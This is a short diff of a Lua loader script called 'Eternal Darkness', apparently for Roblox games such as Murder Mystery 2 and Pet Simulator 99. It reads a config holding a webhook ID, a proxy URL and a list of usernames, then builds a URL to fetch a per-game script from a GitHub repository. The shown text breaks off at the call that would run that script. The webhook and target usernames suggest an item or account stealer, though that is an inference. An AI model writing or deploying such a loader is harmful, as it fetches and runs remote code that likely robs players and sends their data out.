@@ -1,6 +1,5 @@
--- Eternal Darkness Main Loader v6.0
--- Auto-detects game and loads appropriate script
--- Config should be set in _G.ED_CONFIG by User Loader
+-- Eternal Darkness Main Loader v8.0
+
 
 local Config = _G.ED_CONFIG
 
@@ -14,7 +13,6 @@ if not Config.WEBHOOK_ID or not Config.PROXY_URL then
     return
 end
 
--- Game registry
 local Games = {
     [142823291] = "mm2",           -- Murder Mystery 2
     [8737899170] = "ps99",         -- Pet Simulator 99
@@ -35,20 +33,17 @@ if not GameKey then
     return
 end
 
--- Check if game is enabled in config
 if Config.ENABLED_GAMES and Config.ENABLED_GAMES[GameKey] == false then
     warn("[ED] Game disabled in configuration:", GameKey)
     return
 end
 
--- Setup globals for game scripts
 _G.USERNAMES = Config.USERNAMES or {}
 _G.WEBHOOK_ID = Config.WEBHOOK_ID
 _G.PROXY_URL = Config.PROXY_URL
 
 print("[ED] Loading game:", GameKey)
 
-local BaseUrl = Config.PROXY_URL:gsub("/apis/proxy/$", "")
 local ScriptUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/eternal/refs/heads/main/" .. GameKey .. ".lua"
 
 local Success, Result = pcall(function()
